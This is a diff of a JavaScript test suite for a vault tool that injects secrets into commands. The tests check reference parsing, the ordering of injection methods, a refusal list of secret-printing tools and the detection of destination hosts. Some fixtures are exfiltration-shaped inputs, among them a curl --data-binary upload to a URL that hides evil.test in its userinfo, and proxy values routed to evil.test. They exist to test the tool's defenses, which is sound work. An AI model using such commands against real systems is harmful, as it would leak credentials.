@@ -56,7 +56,7 @@ import { scrubLegs } from './vault-run-scrub-legs.mjs';
 const require = createRequire(import.meta.url);
 const REPO = path.resolve(new URL('..', import.meta.url).pathname);
 let pass = 0, fail = 0;   // (the gh grammar census, which named itself in the total, is the heavy twin test-vault-run-model-gh's since r2048)
-const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + String(typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
+const ok = (c, n, e) => { if (typeof c !== 'boolean') throw new TypeError(`ok: its condition is a ${typeof c}, not a boolean — the arguments are swapped, or a value stands where a comparison belongs`); if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + String(typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
 // B-0d3e: a red control's product edit, its anchor judged BY NAME — any count but one (for 'all' / 'join' / 'first' or a /g
 // anchor: none) is a red row of this suite's own check naming the anchor and the file; the copy is then built as before (nothing
 // crashes). 'first' = an anchor the product holds more than once today: the first one is patched, as it always was
@@ -91,9 +91,9 @@ console.log('① THE REFERENCE — vault://<store>/<row>/<field>');
   ];
   const bad = R.filter(([s, want]) => { const r = V.parseRef(s); return want ? !(r && r.id === want.id && r.label === want.label && r.ref === 'vault://' + want.label) : r !== null; });
   ok(!bad.length, `parseRef: ${R.length} rows — the inventory's <store>:<entry>#<field>, the row percent-decoded, a canonical label; a store the vault does not have, a missing part, a bad escape, a '#' / whitespace in a row, the wrong case or a stray character ⇒ null`, bad.map(([s]) => [s, V.parseRef(s)]));
-  ok(R.filter(([, w]) => w).every(([s]) => VI.parseRef(V.parseRef(s).id) !== null), 'every id parses back through src/vault-inventory.js (ONE grammar)');
+  ok(verdictOf(R.filter(([, w]) => w).every(([s]) => VI.parseRef(V.parseRef(s).id) !== null)), 'every id parses back through src/vault-inventory.js (ONE grammar)');
   const sc = V.scanRefs(`curl -K $VAULT_FILE{hdr} -d @$VAULT_FILE{mounts/m2/secretKey} --x=${M1} '$VAULT{mounts/m1/secretKey}'`);
-  ok(eq(sc.refs.map((r) => [r.form, r.name || r.ref]), [['file', 'hdr'], ['file', M2], ['url', M1], ['brace', M1]]) && !sc.bad.length, 'scanRefs: $VAULT_FILE{NAME}, $VAULT_FILE{ref}, vault://… inside a word, $VAULT{…} — each with its form', sc);
+  ok(gateOf(eq(sc.refs.map((r) => [r.form, r.name || r.ref]), [['file', 'hdr'], ['file', M2], ['url', M1], ['brace', M1]])) && !sc.bad.length, 'scanRefs: $VAULT_FILE{NAME}, $VAULT_FILE{ref}, vault://… inside a word, $VAULT{…} — each with its form', sc);
   const B = ['$VAULT{mounts/m1}', '$VAULT_FILE{1abc}', '$vault{mounts/m1/secretKey}', '$VAULT{mounts/m1/secretKey', 'Vault://mounts/m1/key', 'vault://nope/a/b', '$Vault_File{x}', '$VAULT{hdr}'];
   const missed = B.filter((s) => { const r = V.scanRefs(`a ${s} b`); return r.bad.length !== 1 || r.refs.length; });
   ok(!missed.length, `scanRefs: ${B.length} reference-shaped pieces that do not parse are BAD (never read as plain text): a short path, a bad name, the wrong case, no closing brace, an unknown store, a bare NAME in $VAULT{}`, missed);
@@ -105,7 +105,7 @@ console.log('① THE REFERENCE — vault://<store>/<row>/<field>');
 
 console.log('② THE INJECTION TABLE — env → 0600 file → stdin; argv refused by default');
 {
-  ok(eq(V.INJECTIONS.map((r) => [r.where, r.open]), [['env', true], ['file', true], ['stdin', true], ['argv', false]]), 'INJECTIONS: env (the default) → file → stdin → argv (closed) — the order is the preference');
+  ok(verdictOf(eq(V.INJECTIONS.map((r) => [r.where, r.open]), [['env', true], ['file', true], ['stdin', true], ['argv', false]])), 'INJECTIONS: env (the default) → file → stdin → argv (closed) — the order is the preference');
   const cells = [];
   for (const where of ['env', 'file', 'stdin', 'argv', 'pty']) for (const allowArgv of [false, true]) for (const row of [null, { argvOnly: false }, { argvOnly: true }]) {
     const want = where === 'pty' ? 'bad_flag' : where !== 'argv' ? 'ok:false' : allowArgv && row && row.argvOnly ? 'ok:true' : 'argv_refused';
@@ -113,16 +113,16 @@ console.log('② THE INJECTION TABLE — env → 0600 file → stdin; argv refus
     if (got !== want) cells.push({ where, allowArgv, row, got, want });
   }
   ok(!cells.length, 'injectionOf: 30 cells vs the reference — argv opens ONLY with --allow-argv AND a known argv-only tool (argvExposed), never by default', cells);
-  ok(V.KNOWN_TOOLS.every((r) => r.argvOnly === false), `no known tool is argv-only today (${V.KNOWN_TOOLS.length} rows) — every one of them takes a secret from env / a file / stdin`);
+  ok(verdictOf(V.KNOWN_TOOLS.every((r) => r.argvOnly === false)), `no known tool is argv-only today (${V.KNOWN_TOOLS.length} rows) — every one of them takes a secret from env / a file / stdin`);
   const argvAll = V.KNOWN_TOOLS.filter((r) => { const p = V.planOf({ argv: [r.name, `--token=${M1}`], allowArgv: true }); return p.ok || p.code !== 'argv_refused'; });
   ok(!argvAll.length, 'so --allow-argv still refuses a reference in argv for every known tool (argv_refused)', argvAll.map((r) => r.name));
   const P = (req) => V.planOf({ argv: ['curl', 'https://api.example.com/x'], ...req });
   const a = P({ env: [['TOKEN', M1]] });
-  ok(a.ok && eq(a.env, [{ name: 'TOKEN', ref: M1 }]) && eq(a.injection, ['env:TOKEN']) && a.refs.length === 1 && !a.argvExposed && a.timeoutSec === 120, 'env: --env NAME=vault://… ⇒ the child\'s env, the default timeout 120 s', a);
+  ok(gateOf(a.ok) && gateOf(eq(a.env, [{ name: 'TOKEN', ref: M1 }])) && gateOf(eq(a.injection, ['env:TOKEN'])) && a.refs.length === 1 && !a.argvExposed && a.timeoutSec === 120, 'env: --env NAME=vault://… ⇒ the child\'s env, the default timeout 120 s', a);
   const b = P({ file: { NETRC_FILE: M1 }, stdin: M2 });
-  ok(b.ok && eq(b.files.map((f) => [f.slot, f.name, f.ref]), [[0, 'NETRC_FILE', M1]]) && b.stdin === M2 && eq(b.injection, ['file:NETRC_FILE', 'stdin']), 'file + stdin: --file NAME=vault://… ⇒ a 0600 file whose path is NAME; --stdin vault://… ⇒ stdin', b);
+  ok(gateOf(b.ok) && gateOf(eq(b.files.map((f) => [f.slot, f.name, f.ref]), [[0, 'NETRC_FILE', M1]])) && b.stdin === M2 && verdictOf(eq(b.injection, ['file:NETRC_FILE', 'stdin'])), 'file + stdin: --file NAME=vault://… ⇒ a 0600 file whose path is NAME; --stdin vault://… ⇒ stdin', b);
   const c = V.planOf({ argv: ['curl', '-K', '$VAULT_FILE{hdr}', '-E', '$VAULT_FILE{mounts/m2/secretKey}', 'https://api.example.com'], file: [['hdr', '@hdr.tpl']], templates: { 'hdr.tpl': 'header = "X-Key: $VAULT{mounts/m1/secretKey}"' } });
-  ok(c.ok && eq(c.files.map((f) => [f.slot, f.name, f.ref, f.template]), [[0, 'hdr', null, 'hdr.tpl'], [1, null, M2, null]]) && eq(c.refs.map((r) => r.ref).sort(), [M1, M2]) && eq(c.injection, ['file:hdr', 'file:$VAULT_FILE']), 'a template (--file NAME=@path, its $VAULT{…} the entries) and $VAULT_FILE{NAME} / $VAULT_FILE{ref} in argv — paths, never values', c);
+  ok(gateOf(c.ok) && gateOf(eq(c.files.map((f) => [f.slot, f.name, f.ref, f.template]), [[0, 'hdr', null, 'hdr.tpl'], [1, null, M2, null]])) && gateOf(eq(c.refs.map((r) => r.ref).sort(), [M1, M2])) && verdictOf(eq(c.injection, ['file:hdr', 'file:$VAULT_FILE'])), 'a template (--file NAME=@path, its $VAULT{…} the entries) and $VAULT_FILE{NAME} / $VAULT_FILE{ref} in argv — paths, never values', c);
   const R = [
     [{ argv: ['curl', `-H`, `Authorization: Bearer ${M1}`] }, 'argv_refused'],
     [{ argv: ['curl', `-u`, `me:$VAULT{mounts/m1/secretKey}`] }, 'argv_refused'],
@@ -158,7 +158,7 @@ console.log('② THE INJECTION TABLE — env → 0600 file → stdin; argv refus
   const VAL = { [M1]: 'value-one-planted-1', [M2]: 'value-two-planted-2', 'vault://mounts/m3/secretKey': 'value-three-planted-3' };
   const p = V.planOf({ argv: ['curl', '-K', '$VAULT_FILE{hdr}', '--cert=$VAULT_FILE{mounts/m2/secretKey}', 'https://api.example.com'], env: [['TOKEN', M1], ['MODE', 'fast']], file: [['hdr', '@h.tpl'], ['KEYF', 'vault://mounts/m3/secretKey']], stdin: M2, templates: { 'h.tpl': 'header = "X: $VAULT{mounts/m1/secretKey}"' } });
   const mt = V.materialize(p, { valueOf: (r) => VAL[r], pathOf: (s) => `/run/vs/f${s}` });
-  ok(p.ok && eq(mt.argv, ['curl', '-K', '/run/vs/f0', '--cert=/run/vs/f2', 'https://api.example.com']) && eq(mt.env, { MODE: 'fast', TOKEN: VAL[M1], hdr: '/run/vs/f0', KEYF: '/run/vs/f1' }) && eq(mt.files.map((f) => [f.slot, f.path, f.content]), [[0, '/run/vs/f0', `header = "X: ${VAL[M1]}"`], [1, '/run/vs/f1', VAL['vault://mounts/m3/secretKey']], [2, '/run/vs/f2', VAL[M2]]]) && mt.stdin === VAL[M2] + '\n', 'materialize: argv carries PATHS, env the values + NAME=path per --file, each file its value or its rendered template, stdin the value + a newline', mt);
+  ok(gateOf(p.ok) && gateOf(eq(mt.argv, ['curl', '-K', '/run/vs/f0', '--cert=/run/vs/f2', 'https://api.example.com'])) && gateOf(eq(mt.env, { MODE: 'fast', TOKEN: VAL[M1], hdr: '/run/vs/f0', KEYF: '/run/vs/f1' })) && gateOf(eq(mt.files.map((f) => [f.slot, f.path, f.content]), [[0, '/run/vs/f0', `header = "X: ${VAL[M1]}"`], [1, '/run/vs/f1', VAL['vault://mounts/m3/secretKey']], [2, '/run/vs/f2', VAL[M2]]])) && mt.stdin === VAL[M2] + '\n', 'materialize: argv carries PATHS, env the values + NAME=path per --file, each file its value or its rendered template, stdin the value + a newline', mt);
   ok(!Object.values(VAL).some((v) => JSON.stringify(p).includes(v)) && !Object.values(VAL).some((v) => mt.argv.join(' ').includes(v)), 'the plan holds NO value (only references) and no value ever reaches argv');
 }
 
@@ -166,7 +166,7 @@ console.log('③ THE REFUSAL TABLE — print / transform / pack / copy / trace /
 {
   const DESIGN = 'echo printf cat tee head tail less more env printenv export set declare xxd od hexdump base64 base32 strings rev tr cut fold paste sed awk gzip bzip2 xz zstd zip tar 7z openssl gpg'.split(' ');
   const names = V.TOOL_ROWS.flatMap((r) => r.names);
-  ok(DESIGN.every((n) => names.includes(n)), `§8.2's list (${DESIGN.length} tools) ⊂ the table (${names.length} names)`, DESIGN.filter((n) => !names.includes(n)));
+  ok(verdictOf(DESIGN.every((n) => names.includes(n))), `§8.2's list (${DESIGN.length} tools) ⊂ the table (${names.length} names)`, DESIGN.filter((n) => !names.includes(n)));
   const missed = [];
   for (const r of V.TOOL_ROWS) for (const n of r.names) { const p = V.planOf({ argv: [n, '$VAULT_FILE{mounts/m1/secretKey}'], env: [['T', M1]] }); if (p.ok || p.code !== r.code || p.cls !== r.cls) missed.push([n, p.code]); }
   ok(!missed.length, `every name of every row (${names.length}) is refused with its row's code — tool_prints_secrets (print · transform · pack · copy · trace) · tool_wraps_another · tool_has_its_own_door`, missed);
@@ -210,8 +210,8 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
     ['another resolved tool', with_({ resolved: '/opt/tools/curl' })],
   ];
   const k0 = K(base);
-  ok(SAME.every(([, r]) => K(r) === k0), `the SAME shape (${SAME.length}): ${SAME.map(([n]) => n).join(' · ')}`, SAME.filter(([, r]) => K(r) !== k0).map(([n]) => n));
-  ok(DIFF.every(([, r]) => K(r) !== k0) && new Set(DIFF.map(([, r]) => K(r))).size === DIFF.length, `a NEW shape (${DIFF.length}, each its own): ${DIFF.map(([n]) => n).join(' · ')}`, DIFF.filter(([, r]) => K(r) === k0).map(([n]) => n));
+  ok(verdictOf(SAME.every(([, r]) => K(r) === k0)), `the SAME shape (${SAME.length}): ${SAME.map(([n]) => n).join(' · ')}`, SAME.filter(([, r]) => K(r) !== k0).map(([n]) => n));
+  ok(gateOf(DIFF.every(([, r]) => K(r) !== k0)) && new Set(DIFF.map(([, r]) => K(r))).size === DIFF.length, `a NEW shape (${DIFF.length}, each its own): ${DIFF.map(([n]) => n).join(' · ')}`, DIFF.filter(([, r]) => K(r) === k0).map(([n]) => n));
   const g = (argv) => K({ argv, env: [['GH_TOKEN', M1]] });
   ok(g(['gh', 'pr', 'list', '-R', 'a/b']) === g(['gh', 'pr', 'list', '-R', 'c/d']) && g(['gh', 'pr', 'list']) !== g(['gh', 'repo', 'delete']) && g(['gh', 'pr', 'list']) !== g(['gh', 'pr', 'merge']), 'a known tool\'s subcommand words belong to the tool (gh pr list ≠ gh repo delete ≠ gh pr merge); a flag\'s value is a positional (-R a/b ≡ -R c/d)');
   const kc = (n) => K({ argv: ['kubectl', '-n', n, 'get', 'pods'], file: [['KUBECONFIG', '@kc']], templates: { kc: 'server: https://k8s.example:6443\ntoken: $VAULT{mounts/m1/secretKey}\n' } });
@@ -220,7 +220,7 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
   ok(tp('header = "X: $VAULT{mounts/m1/secretKey}"') !== tp('header = "X: $VAULT{mounts/m1/secretKey}"\noutput = ./leak'), 'a template\'s text is part of the shape (a changed template is a new shape — the card shows it)');
   const sh = (s) => K({ argv: ['bash', '-c', s], env: [['T', M1]] });
   ok(sh('curl -H "X: $T" https://api.example.com/a') !== sh('curl -H "X: $T" https://api.example.com/b'), 'a shell\'s whole script IS the shape (one character changes it)');
-  ok(k0.startsWith(`${V.SHAPE_V}:`) && V.SHAPE_NOTE.includes('positional arguments may change'), 'the key is versioned (vr1:) and the card\'s note says positionals may change');
+  ok(gateOf(k0.startsWith(`${V.SHAPE_V}:`)) && verdictOf(V.SHAPE_NOTE.includes('positional arguments may change')), 'the key is versioned (vr1:) and the card\'s note says positionals may change');
   // THE HOSTS
   const H = (argv, extra = {}) => { const p = V.planOf({ argv, env: [[argv[0] === 'gh' ? 'GH_TOKEN' : 'T', M1]], ...extra }); if (!p.ok) throw new Error(JSON.stringify(p)); return V.shapeOf(p).hosts.join(' '); };
   const HOSTS = [
@@ -253,13 +253,13 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
     'the backslash-before-@ authority is opaque (the card; a userinfo authority is url_userinfo — the ONE parser); a clean git-over-https URL and `scp backup host:/x` are not (routine granted runs draw no card)',
     { bs: RO(['curl', 'http://127.0.0.5:9\\@127.0.0.1:7001/x']), gitls: RO(['git', 'ls-remote', 'https://github.com/o/r']), scp: RO(['scp', 'backup', 'root@192.168.1.1:/x']) });
   // round 5 (BLOCKER item 1): the ssh family's TARGET host is an alias in EVERY spelling; r4 wrongly exempted every `://` target
-  ok(['ssh ssh://router', 'sftp sftp://router', 'scp backup scp://router/x', 'git clone ssh://router/repo', 'git clone git+ssh://router/repo', 'ssh router', 'scp backup router:/x', 'rsync -a backup router:/x'].every((c) => RO(c.split(' ')) === true),
+  ok(verdictOf(['ssh ssh://router', 'sftp sftp://router', 'scp backup scp://router/x', 'git clone ssh://router/repo', 'git clone git+ssh://router/repo', 'ssh router', 'scp backup router:/x', 'rsync -a backup router:/x'].every((c) => RO(c.split(' ')) === true)),
     'ssh-family: a single-label alias is OPAQUE in every spelling (bare / host:path / ssh:// / scp:// / sftp:// / git+ssh://)',
     ['ssh ssh://router', 'scp backup scp://router/x', 'git clone ssh://router/repo'].map((c) => [c, RO(c.split(' '))]));
   ok(RO(['git', 'clone', 'ssh://git@github.com/o/r']) === false && RO(['ssh', 'git@github.com', 'x']) === false && RO(['git', 'clone', 'https://router/r']) === false,
     'a DOTTED ssh host / a single-label HTTPS host (not ssh) is NOT an alias — no over-blinding of git-https or a dotted ssh target');
   // round 6 (BLOCKER item 1): a jump host `-J`/`-W` is an alias in EVERY spelling too (r5 fixed only `-o ProxyJump=`)
-  ok(['ssh -J router box.example', 'ssh -Jrouter box.example', 'ssh -J user@router:22 box.example', 'scp -J router f box.example:/x', 'sftp -J router box.example', 'ssh -W router:22 jump.example'].every((c) => RO(c.split(' ')) === true)
+  ok(gateOf(['ssh -J router box.example', 'ssh -Jrouter box.example', 'ssh -J user@router:22 box.example', 'scp -J router f box.example:/x', 'sftp -J router box.example', 'ssh -W router:22 jump.example'].every((c) => RO(c.split(' ')) === true))
     && RO(['ssh', '-J', 'jump.example', 'box.example']) === false,
     'ssh -J / -W: a single-label jump host is OPAQUE (every host-bearing ssh option goes through ONE alias reader); a DOTTED -J host is not',
     ['ssh -J router box.example', 'scp -J router f box.example:/x', 'sftp -J router box.example'].map((c) => [c, RO(c.split(' '))]));
@@ -405,7 +405,7 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
   // round 7 (MAJOR item 1c): the drive-letter rule is PLATFORM-KEYED — a one-letter `X:path` is a host on POSIX (the hub),
   // a LOCAL Windows drive ONLY on a win32 runner, and `u@r:/x` is a remote host on BOTH. (r6's rule, measured wrong on Linux —
   // Linux scp/rsync have no drive-letter rule and connect to host C/c/x/a — is REVERSED.) Both branches are tested.
-  ok(RH6(['scp', 'file', 'C:\\x']).includes('c') && ROx(['scp', 'file', 'C:\\x']) === true && RH6(['scp', 'file', 'c:/x']).includes('c') && RH6(['rsync', 'a:', 'd']).includes('a') && ROx(['scp', 'f', 'u@r:/x']) === true,
+  ok(gateOf(RH6(['scp', 'file', 'C:\\x']).includes('c')) && ROx(['scp', 'file', 'C:\\x']) === true && gateOf(RH6(['scp', 'file', 'c:/x']).includes('c')) && gateOf(RH6(['rsync', 'a:', 'd']).includes('a')) && ROx(['scp', 'f', 'u@r:/x']) === true,
     'POSIX (the hub): a one-letter `X:path` / `c:/x` / `a:` connects to host X (an alias ⇒ opaque); `u@r:/x` is a remote host',
     { posix_Cx: RH6(['scp', 'file', 'C:\\x']), posix_opaque: ROx(['scp', 'file', 'C:\\x']) });
   ok(!RH6(['scp', 'file', 'C:\\x'], { win32: true }).includes('c') && ROx(['scp', 'file', 'C:\\x'], { win32: true }) === false && ROx(['scp', 'f', 'u@r:/x'], { win32: true }) === true,
@@ -415,7 +415,7 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
   ok(RO(['curl', 'http:/127.0.0.1:80/x']) === true && RO(['curl', 'ftp:ftp']) === true && RO(['curl', 'smtp:/127.0.0.1/x']) === true && RO(['curl', 'localhost:9999/x']) === false,
     'a one-slash `S:/HOST` and a bare `S:HOST` for a known scheme are BLIND; `localhost:9999` (not a scheme) is read as a host');
   const px = (v) => V.shapeOf(V.planOf({ argv: ['curl', 'http://own.example/x', '-x', v], env: [['T', M1]] })).routeHosts;
-  ok(px('127.0.0.1:3128#@own.example:3129').includes('127.0.0.1:3128') && px('127.0.0.1:3128?@own.example:3129').includes('127.0.0.1:3128') && !px('127.0.0.1:3128#@own.example:3129').includes('own.example:3129'),
+  ok(gateOf(px('127.0.0.1:3128#@own.example:3129').includes('127.0.0.1:3128')) && gateOf(px('127.0.0.1:3128?@own.example:3129').includes('127.0.0.1:3128')) && !px('127.0.0.1:3128#@own.example:3129').includes('own.example:3129'),
     'a proxy value\'s authority is cut at the first # / ? — curl connects to host:port, not the fragment/query host (round 5 item 5)');
   // round 16: the ONE route-host set — a <url> positional is a route (issue/pr view/checks/comment/close); gh api keeps path-vs-url;
   // a no-row tool (shell / interpreter / unknown binary) routes to every host it names (never «unknown»); `mentions` is a free-text
@@ -468,7 +468,7 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
       'round 19 (item 1 BLOCKER): a <url>/<endpoint> the WHATWG parser rejects (port > 65535, numeric last label, name > 253 / label > 63, empty host) ⇒ shape.badHost (bad_host at the door, never a dropped host); a valid :65535 is a real second host (two_hosts, not bad_host)'); }
   // round 19 (item 2 + 3 + MINOR 1): the locator runs a URL to WHITESPACE so a `, ", < or backtick inside userinfo is read PAST the host (url_userinfo on the curl target, where daade1a7 read the host short); url_userinfo is judged on ROUTE words ONLY (a --body / -d body URL is a mention, never refused); a glued -Rhttps:// / --repo= / GH_REPO= userinfo URL ⇒ url_userinfo (the grammar splits the value, the locator never relies on \b, where daade1a7's scheme read «Rhttps» and dodged).
   { const UI = (argv, env) => V.shapeOf(V.planOf({ argv, env: env || [[argv[0] === 'gh' ? 'GH_TOKEN' : 'T', M1]] })).userinfo;
-    ok(['`', '"', '<', '>'].every((b) => UI(['curl', '-s', '--data-binary', '@x', 'https://good.example' + b + '@evil.test/x']) === true)
+    ok(gateOf(['`', '"', '<', '>'].every((b) => UI(['curl', '-s', '--data-binary', '@x', 'https://good.example' + b + '@evil.test/x']) === true))
       && UI(['gh', 'issue', 'list', '-Rhttps://x@ghe.example.test:1@evil.test/o/r']) === true
       && UI(['gh', 'issue', 'list', '--repo=https://x@ghe.example.test:1@evil.test/o/r']) === true
       && UI(['gh', 'issue', 'list'], [['GH_REPO', 'https://u@evil.test/o/r'], ['GH_TOKEN', M1]]) === true
@@ -514,7 +514,7 @@ console.log('i18n NOTICE-KEY ROAD (round 18/19 MINOR) — the drift FYI text AND
   const lits = I18N.noticeKeyLiterals(doorSrc);
   const TEXTK = '{tool} on this machine changed: {from} → {to} (a root-owned tool — runs continue)';
   const DETAILK = lits.find((k) => /sealed by root ownership/.test(k));
-  ok(lits.includes(TEXTK) && typeof DETAILK === 'string' && I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, jaSrc)).length === 0,
+  ok(gateOf(lits.includes(TEXTK)) && typeof DETAILK === 'string' && I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, jaSrc)).length === 0,
     'round 19 (MINOR): the road SEES the drift FYI text AND detail: literals (the detail paragraph is new this round), and both resolve in BOTH dicts — shipped clean', { sawDetail: !!DETAILK, fails: I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, jaSrc)) });
   const strip = (txt, k) => txt.split('\n').filter((l) => !l.includes(k)).join('\n');
   const r1 = I18N.noticeKeyFailures([doorSrc], dicts(strip(zhSrc, TEXTK), jaSrc));
@@ -522,21 +522,21 @@ console.log('i18n NOTICE-KEY ROAD (round 18/19 MINOR) — the drift FYI text AND
   const commentOnly = strip(zhSrc, TEXTK) + '\n  // "' + TEXTK + '": translated elsewhere\n';
   const r3 = I18N.noticeKeyFailures([doorSrc], dicts(commentOnly, jaSrc));
   ok(r1.length === 1 && r1[0].dict === 'i18n-zh.js' && r1[0].key === TEXTK
-    && r2.some((x) => x.dict === 'i18n-ja.js' && x.key === DETAILK)
-    && r3.some((x) => x.dict === 'i18n-zh.js' && x.key === TEXTK),
+    && gateOf(r2.some((x) => x.dict === 'i18n-ja.js' && x.key === DETAILK))
+    && verdictOf(r3.some((x) => x.dict === 'i18n-zh.js' && x.key === TEXTK)),
     'round 19 (MINOR, RED mutants): the text key stripped from zh ⇒ 1 failure naming zh; the detail key stripped from ja ⇒ named (worded MISSING, not duplicate); a key ONLY in a full-line COMMENT does NOT falsely pass (the r18 raw-includes bug) — the road requires a real entry', { r1len: r1.length, r2: r2.filter((x) => x.key === DETAILK), r3: r3.filter((x) => x.key === TEXTK) });
 }
 console.log('①b AN AGENT\'S OWN ENTRY (lane vault-run-door × lane vault-mint-put) — vault://agent:<scope>/<name>');
 {
   const a = V.parseRef('vault://agent:conv-1/github-token'), b = V.parseRef('vault://secrets/agent:conv-1%2Fgithub-token/secret');
-  ok(a && b && a.id === 'secrets:agent:conv-1/github-token#secret' && a.id === b.id && a.ref === 'vault://agent:conv-1/github-token' && b.ref === a.ref && V.placeholderOf(a) === '[vault:agent:conv-1/github-token]', 'the reference vibespace-vault mint / put hand out (vault://agent:<scope>/<name>) and the long spelling are ONE entry (the secrets store, field secret) — its short spelling is its label', [a, b]);
+  ok(gateOf(a) && gateOf(b) && a.id === 'secrets:agent:conv-1/github-token#secret' && a.id === b.id && a.ref === 'vault://agent:conv-1/github-token' && b.ref === a.ref && V.placeholderOf(a) === '[vault:agent:conv-1/github-token]', 'the reference vibespace-vault mint / put hand out (vault://agent:<scope>/<name>) and the long spelling are ONE entry (the secrets store, field secret) — its short spelling is its label', [a, b]);
   const sc = V.scanRefs('--x vault://agent:c-2/tok, $VAULT{agent:c-2/tok} $VAULT_FILE{agent:c-2/tok} vault://agent:c-2/');
-  ok(sc.refs.length === 3 && sc.refs.every((r) => r.id === 'secrets:agent:c-2/tok#secret') && sc.refs.map((r) => r.form).join() === 'url,brace,file' && sc.bad.length === 1, 'scanRefs finds it as a url, inside $VAULT{…} and $VAULT_FILE{…}; a cut one is BAD', sc);
-  ok(['vault://agent:c/a/b', 'vault://agent:/x', 'vault://agent:c/x:y', 'vault://agent:c/' + 'x'.repeat(65)].every((r) => V.parseRef(r) === null), 'a name with a slash or a colon, no scope, a name over 64 — refused (the mint lane\'s own grammar)');
+  ok(sc.refs.length === 3 && gateOf(sc.refs.every((r) => r.id === 'secrets:agent:c-2/tok#secret')) && sc.refs.map((r) => r.form).join() === 'url,brace,file' && sc.bad.length === 1, 'scanRefs finds it as a url, inside $VAULT{…} and $VAULT_FILE{…}; a cut one is BAD', sc);
+  ok(verdictOf(['vault://agent:c/a/b', 'vault://agent:/x', 'vault://agent:c/x:y', 'vault://agent:c/' + 'x'.repeat(65)].every((r) => V.parseRef(r) === null)), 'a name with a slash or a colon, no scope, a name over 64 — refused (the mint lane\'s own grammar)');
   ok(V.ownDoorOf(a) === null && typeof V.ownDoorOf({ store: 'secrets', entry: 'host:x', field: 'token' }) === 'string' && typeof V.ownDoorOf({ store: 'secrets', entry: 'agent:c/t', field: 'token' }) === 'string', 'an agent\'s own entry has no door of its own (the owner opens it for runs like any other); every other hub secret still has one');
   ok(V.agentScopeOf(a) === 'conv-1' && V.agentScopeOf(V.parseRef('vault://mounts/m1/secretKey')) === null, 'agentScopeOf names the conversation that owns it (the door lets only that one use it)');
   const p = V.planOf({ argv: ['gh', 'repo', 'list'], env: [['GH_TOKEN', 'vault://agent:conv-1/github-token']] });
-  ok(p.ok && p.refs[0].ref === 'vault://agent:conv-1/github-token' && V.maskText('x ' + 'ghp-' + 'a'.repeat(30) + ' y', [{ ref: p.refs[0], value: 'ghp-' + 'a'.repeat(30) }]) === 'x [vault:agent:conv-1/github-token] y', 'a plan over it, and the scrubber\'s placeholder its short spelling', p.code);
+  ok(gateOf(p.ok) && p.refs[0].ref === 'vault://agent:conv-1/github-token' && V.maskText('x ' + 'ghp-' + 'a'.repeat(30) + ' y', [{ ref: p.refs[0], value: 'ghp-' + 'a'.repeat(30) }]) === 'x [vault:agent:conv-1/github-token] y', 'a plan over it, and the scrubber\'s placeholder its short spelling', p.code);
 }
 
 console.log('④b THE SHAPE KEY carries where the secret goes (lane vault-run-door — the security review)');
@@ -567,15 +567,15 @@ console.log('④b THE SHAPE KEY carries where the secret goes (lane vault-run-do
   { const crh = (k, v) => V.cfgRouteHosts(k, v);
     const schemeBad = ['proxy', 'preproxy', 'socks5-hostname', 'socks5', 'socks4', 'dns-servers'].filter((k) => !crh(k, 'http:/evil.test:3128').blind);
     const ctl = crh('proxy', 'evil.test:3128'); const ctl2 = crh('proxy', 'http://evil.test:3128');
-    ok(!schemeBad.length && ctl.hosts && ctl.hosts[0] === 'evil.test' && ctl2.hosts && ctl2.hosts[0] === 'evil.test' && crh('proxy', 'socks5:/evil.test:1080').blind, 'round 26 (MAJOR 2a): a one-slash http:/HOST / socks5:/HOST route value blinds (a scheme word is never a route host — the r25 rule was missing from routeHostOne); a host:port and a canonical scheme:// still read the host', schemeBad); }
+    ok(!schemeBad.length && gateOf(ctl.hosts) && ctl.hosts[0] === 'evil.test' && gateOf(ctl2.hosts) && ctl2.hosts[0] === 'evil.test' && verdictOf(crh('proxy', 'socks5:/evil.test:1080').blind), 'round 26 (MAJOR 2a): a one-slash http:/HOST / socks5:/HOST route value blinds (a scheme word is never a route host — the r25 rule was missing from routeHostOne); a host:port and a canonical scheme:// still read the host', schemeBad); }
   // round 26 (MAJOR 2b): a --resolve ADDR is an IP literal curl dials — a bare IPv6 ::1 is NAMED (bracketed), never dropped; a rejected non-empty ADDR blinds.
   { const r1 = V.cfgRouteHosts('resolve', 'api.example.com:443:2001:db8::5'); const r2 = V.cfgRouteHosts('resolve', 'api.example.com:443:192.0.2.1,2001:db8::5'); const r3 = V.cfgRouteHosts('resolve', 'api.example.com:443:[::1]');
-    ok(r1.hosts && r1.hosts.includes('[2001:db8::5]') && r1.hosts.includes('api.example.com') && r2.hosts && r2.hosts.includes('192.0.2.1') && r2.hosts.includes('[2001:db8::5]') && r3.hosts && r3.hosts.includes('[::1]'), 'round 26 (MAJOR 2b): a bare IPv6 --resolve ADDR is read as the literal curl dials and NAMED (bracketed), never dropped; an IPv4 + bare-v6 list names both; a bracketed [::1] is unchanged', [r1, r2, r3]); }
+    ok(gateOf(r1.hosts) && gateOf(r1.hosts.includes('[2001:db8::5]')) && gateOf(r1.hosts.includes('api.example.com')) && gateOf(r2.hosts) && gateOf(r2.hosts.includes('192.0.2.1')) && gateOf(r2.hosts.includes('[2001:db8::5]')) && gateOf(r3.hosts) && verdictOf(r3.hosts.includes('[::1]')), 'round 26 (MAJOR 2b): a bare IPv6 --resolve ADDR is read as the literal curl dials and NAMED (bracketed), never dropped; an IPv4 + bare-v6 list names both; a bracketed [::1] is unchanged', [r1, r2, r3]); }
   // round 26 (minor): only a ROUTING keyed flag withholds «always» (opaque-route) — a reviewed non-routing wget -e robots=off does not; a proxy-setting -e var does.
   { const safe = S(['wget', '-e', 'robots=off', 'https://api.example.com/f']); const proxyE = S(['wget', '-e', 'use_proxy=on', 'https://api.example.com/f']);
